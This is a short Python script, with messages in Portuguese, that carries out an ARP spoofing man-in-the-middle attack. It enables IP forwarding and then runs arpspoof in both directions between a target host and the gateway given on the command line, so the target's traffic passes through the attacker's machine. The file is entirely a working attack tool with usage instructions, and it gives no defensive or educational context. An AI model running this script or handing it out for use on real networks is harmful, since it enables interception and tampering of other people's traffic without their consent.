#!/usr/bin/python3
import subprocess
import sys
import time

def enable_ip_forward():
    try:
        subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True, check=True)
        print("IP Forwarding habilitado com sucesso")
    except subprocess.CalledProcessError:
        print("Erro ao habilitar IP Forwarding")
        sys.exit(1)

def start_arp_spoof(interface, target, gateway):
    try:
        # Iniciar primeiro processo arpspoof (target -> gateway)
        p1 = subprocess.Popen(["arpspoof", "-i", interface, "-t", target, gateway])
        
        # Iniciar segundo processo arpspoof (gateway -> target)
        p2 = subprocess.Popen(["arpspoof", "-i", interface, "-t", gateway, target])
        
        print(f"Ataque ARP Spoofing iniciado:")
        print(f"Interface: {interface}")
        print(f"Alvo: {target}")
        print(f"Gateway: {gateway}")
        
        return p1, p2
    
    except Exception as e:
        print(f"Erro ao iniciar ARP Spoofing: {e}")
        sys.exit(1)

def main():
    if len(sys.argv) != 4:
        print("Uso: ./arp_spoof.py <interface> <ip_alvo> <ip_gateway>")
        print("Exemplo: ./arp_spoof.py eth0 192.168.1.100 192.168.1.1")
        sys.exit(1)

    interface = sys.argv[1]
    target = sys.argv[2]
    gateway = sys.argv[3]

    # Habilitar IP Forwarding
    enable_ip_forward()

    # Iniciar ARP Spoofing
    p1, p2 = start_arp_spoof(interface, target, gateway)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nInterrompendo ataque...")
        p1.terminate()
        p2.terminate()
        print("Ataque finalizado")

if __name__ == "__main__":
    main()